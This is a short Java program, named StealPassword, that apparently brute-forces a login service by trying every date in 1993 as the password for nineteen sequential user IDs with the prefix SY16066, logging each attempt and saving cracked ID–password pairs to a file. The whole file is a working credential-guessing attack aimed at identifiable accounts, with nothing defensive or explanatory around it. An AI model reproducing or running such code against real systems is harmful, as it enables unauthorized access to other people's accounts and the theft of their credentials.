package spider;

import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.IOException;
import java.io.PrintWriter;
import java.time.LocalDate;

public class StealPassword {
    String prefix = "SY16066";
    CloseableHttpClient client = HttpClients.createDefault();

    public static void main(String[] args) throws IOException {
        new StealPassword();
    }

    StealPassword() throws IOException {
        PrintWriter writer = new PrintWriter("user.txt");
        for (int i = 1; i < 20; i++) {
            String userId = String.format("%s%02d", prefix, i);
            LocalDate date = LocalDate.of(1993, 1, 1);
            LocalDate end = LocalDate.of(1994, 1, 1);
            while (date.equals(end) == false) {
                String password = date.toString().replace("-", "");
                date = date.plusDays(1);
                System.out.println(userId + " " + password);
                if (Util.login(userId, password, client)) {
                    writer.println(userId + " " + password);
                    break;
                }
            }
        }
        writer.close();
    }
}